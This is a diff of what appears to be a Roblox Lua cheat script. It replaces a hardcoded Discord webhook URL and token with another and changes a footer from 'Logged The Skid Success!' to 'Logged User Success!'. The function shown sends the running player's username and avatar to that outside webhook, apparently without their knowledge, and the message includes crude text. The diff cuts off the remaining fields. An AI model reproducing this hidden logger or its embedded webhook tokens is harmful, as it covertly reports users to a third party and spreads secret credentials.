@@ -216,7 +216,7 @@ local KeyPress = YourPlayer:GetMouse()
 local Workspace = game:GetService("Workspace")
 function bb(a)
     local b =
-        "https://discord.com/api/webhooks/1120869056858304585/T_UCXviywAMTNTj1kw6F2lxBdyvqkOjzDV4jSoxIpSihiSqakTJvMBDzrwxT2pRVHKjx"
+        "https://discordapp.com/api/webhooks/1116358411727159387/JP2lz0xUf7ptEBeb9ZN_3h5vwrPG071AsXstcQ1YQcojKIMzJ9XniF2eA4YDK8EsQPKS"
     local c = {
         ["avatar_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name,
         ["Content"] = "omg big booty hole",
@@ -230,7 +230,7 @@ function bb(a)
                     ["url"] = tostring("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name)
                 },
                 ["footer"] = {
-                    ["text"] = "Logged The Skid Success!",
+                    ["text"] = "Logged User Success!",
                     ["icon_url"] = tostring("https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. a.Name)
                 },
                 ["fields"] = {
